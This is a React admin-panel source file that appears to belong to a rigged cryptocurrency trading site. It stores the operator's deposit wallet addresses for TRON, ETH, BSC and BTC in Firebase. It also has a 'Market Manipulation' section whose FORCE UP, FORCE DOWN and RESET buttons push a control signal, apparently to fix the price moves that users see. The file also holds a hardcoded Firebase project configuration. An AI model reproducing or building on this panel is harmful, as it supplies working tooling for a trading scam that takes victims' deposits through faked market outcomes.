import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue } from "firebase/database";
import { useEffect, useState } from "react";

const firebaseConfig = {
    apiKey: "AIzaSyBx4i‑LJcCuYNWfYU_TfXA6_LXcY263RbA",
    authDomain: "jay-shree-shyam0back.firebaseapp.com",
    projectId: "jay-shree-shyam0back",
    storageBucket: "jay-shree-shyam0back.firebasestorage.app",
    messagingSenderId: "1084861244978",
    appId: "1:1084861244978:web:192eb36bf370ffa60a3e2b",
    measurementId: "G‑WZVE9YYDGB",
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

export default function Admin() {
    const [wallets, setWallets] = useState({ TRON: "", ETH: "", BSC: "", BTC: "" });

    // Load wallets from Firebase
    useEffect(() => {
        const wRef = ref(db, "settings/wallets");
        return onValue(wRef, (snap) => {
            const data = snap.val() || {};
            setWallets({
                TRON: data.TRON || "",
                ETH: data.ETH || "",
                BSC: data.BSC || "",
                BTC: data.BTC || "",
            });
        });
    }, []);

    const handleChange = (e) => {
        setWallets({ ...wallets, [e.target.name]: e.target.value });
    };

    const saveSettings = () => {
        set(ref(db, "settings/wallets"), wallets)
            .then(() => alert("Wallets saved!"))
            .catch((err) => alert("Error: " + err.message));
    };

    const sendSignal = (type) => {
        set(ref(db, "control/signal"), type).catch((e) => alert("Signal error: " + e.message));
    };

    return (
        <div className="p-6">
            <h2 className="text-2xl font-bold mb-4 text-white">Admin Panel</h2>
            <div className="grid gap-4 max-w-md">
                {"TRON ETH BSC BTC".split(" ").map((key) => (
                    <div key={key}>
                        <label className="block text-gray-400 mb-1">{key} Wallet</label>
                        <input
                            name={key}
                            value={wallets[key]}
                            onChange={handleChange}
                            className="w-full p-2 bg-[#111] border border-[#333] rounded text-white"
                        />
                    </div>
                ))}
                <button
                    onClick={saveSettings}
                    className="mt-2 bg-neon-green text-black py-2 rounded"
                >
                    Save Wallets
                </button>
                <div className="mt-6">
                    <h3 className="text-lg font-semibold text-white mb-2">Market Manipulation</h3>
                    <button
                        onClick={() => sendSignal("UP")}
                        className="mr-2 bg-neon-green text-black py-1 px-3 rounded"
                    >
                        FORCE UP
                    </button>
                    <button
                        onClick={() => sendSignal("DOWN")}
                        className="bg-neon-red text-black py-1 px-3 rounded"
                    >
                        FORCE DOWN
                    </button>
                    <button
                        onClick={() => sendSignal("NEUTRAL")}
                        className="ml-2 bg-gray-600 text-white py-1 px-3 rounded"
                    >
                        RESET
                    </button>
                </div>
            </div>
        </div>
    );
}
